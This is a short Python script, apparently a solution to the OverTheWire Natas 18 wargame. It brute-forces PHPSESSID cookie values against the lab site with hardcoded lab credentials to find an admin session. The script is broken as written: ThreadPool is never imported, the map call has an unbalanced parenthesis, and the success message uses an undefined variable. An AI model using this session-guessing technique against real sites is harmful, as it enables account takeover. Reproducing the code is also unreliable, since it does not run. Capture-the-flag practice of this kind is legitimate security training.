import requests

def task(item):
    print("Testing: "+ str(item))
    cook={'PHPSESSID': str(item)}
    res = requests.get(url,auth=auth,cookies=cook)
    return res


auth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
url  = 'http://natas18.natas.labs.overthewire.org/'
pool = ThreadPool()
with ThreadPool() as pool:
    for result in pool.map(task,(range(1,640)):
        if 'regular user' not in result.text:
            print("We found it:"+str(i))
            print(result.text)
            break


